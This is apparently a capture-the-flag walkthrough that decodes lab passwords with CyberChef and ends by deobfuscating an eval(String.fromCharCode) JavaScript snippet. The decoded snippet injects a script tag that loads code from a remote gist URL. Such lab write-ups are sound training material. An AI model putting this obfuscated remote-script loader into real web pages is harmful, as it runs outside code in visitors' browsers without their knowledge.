# Elf McEager becomes CyberElf

For Server provide (<TARGET_IP>) as the IP address provided to you for the remote machine. The credentials for the user account is:

  - User name: `Administrator`
  - User password: `sn0wF!akes!!!`

So then let's connect ourselves to the remote machine using Remmina.

We'll use [CyberChef](https://gchq.github.io/CyberChef/) also.

- What is the password to the KeePass database?
	
	- Open the `dGhlZ3JpbmNod2FzaGVyZQ==` folder, then executes the Keepass executable and try to enter the password `mceagerrockstar`. Wrong.
	- Open CyberCher and try to decode the folder name.
	- Put `dGhlZ3JpbmNod2FzaGVyZQ==` in the Input panel and add to recipe `Magic`. It's probably Base64.
	- `thegrinchwashere`
	- Let's enter the password inside Keepass.

- What is the encoding method listed as the 'Matching ops'?

	- You an see this in output panel
	- `Base64`

- What is the decoded password value of the Elf Server?

	- Navigate into Network tab (in Keepass).
	- Double click on the unique entry.
	- Click on the button to see the password without bullets, read the notes below.
	- Paste this in input on CyberChef.
	- Use the recipe `From Hex`.
	- `Sn0wm4n!`

- What is the decoded password value for ElfMail?

	- Switch Keepass tab to see eMail entries.
	- Copy the elfMail password and read the notes.
	- `&#105;&#99;&#51;&#83;&#107;&#97;&#116;&#105;&#110;&#103;&excl;`
	- Paste this input in CyberChef with recipe `From HTML Entity`.
	- `ic3Skating!`

- Decode the last encoded value. What is the flag?

	- Switch Keepass tab to see Recycle Bin entries.
	- Open the unique entry.
	- The password shown in cleartext without bullets is `nothinghere`. Mhh...
	- Let's read the notes.
	
	
	   eval(String.fromCharCode(118, 97, 114, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 49, 48, 51, 44, 32, 49, 48, 53, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 48, 51, 44, 32, 49, 48, 53, 44, 32, 49, 49, 54, 44, 32, 49, 48, 52, 44, 32, 49, 49, 55, 44, 32, 57, 56, 44, 32, 52, 54, 44, 32, 57, 57, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 52, 55, 44, 32, 49, 48, 52, 44, 32, 49, 48, 49, 44, 32, 57, 55, 44, 32, 49, 49, 56, 44, 32, 49, 48, 49, 44, 32, 49, 49, 48, 44, 32, 49, 49, 52, 44, 32, 57, 55, 44, 32, 49, 48, 53, 44, 32, 49, 50, 50, 44, 32, 57, 55, 44, 32, 52, 55, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 52, 57, 44, 32, 52, 57, 44, 32, 49, 48, 48, 44, 32, 53, 49, 44, 32, 53, 48, 44, 32, 52, 57, 44, 32, 53, 48, 44, 32, 53, 50, 44, 32, 53, 50, 44, 32, 57, 57, 44, 32, 53, 50, 44, 32, 49, 48, 48, 44, 32, 53, 52, 44, 32, 53, 52, 44, 32, 53, 53, 44, 32, 53, 50, 44, 32, 53, 50, 44, 32, 53, 52, 44, 32, 49, 48, 48, 44, 32, 57, 56, 44, 32, 49, 48, 50, 44, 32, 49, 48, 48, 44, 32, 53, 55, 44, 32, 57, 55, 44, 32, 53, 49, 44, 32, 53, 48, 44, 32, 53, 55, 44, 32, 53, 54, 44, 32, 57, 55, 44, 32, 53, 54, 44, 32, 53, 54, 44, 32, 57, 56, 44, 32, 53, 54, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125));
	
	- Put this in CyberCHEF Input and take as recipe `From CharCode`, delimiter `comma`, base `10`.
	
	   .ar somestring = document.createElement('script'); somestring.type = 'text/javascript'; somestring.async = true;somestring.src = String.fromCharCode(104, 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 115, 116, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 104, 101, 97, 118, 101, 110, 114, 97, 105, 122, 97, 47);   var alls = document.getElementsByTagName('script'); var nt3 = true; for ( var i = alls.length; i--;) { if (alls[i].src.indexOf(String.fromCharCode(49, 49, 100, 51, 50, 49, 50, 52, 52, 99, 52, 100, 54, 54, 55, 52, 52, 54, 100, 98, 102, 100, 57, 97, 51, 50, 57, 56, 97, 56, 56, 98, 56)) > -1) { nt3 = false;} } if(nt3 == true){document.getElementsByTagName("head")[0].appendChild(somestring); }
	
	- Let's add another rule to the recipe, the same as before. It's seems there are things to be evaluated twice.
	- `.https://gist.github.com/heavenraiza/1d321244c4d667446dbfd9a3298a88b8`
	- `THM{65**12dcf******dca0**********535}`




### see you ...
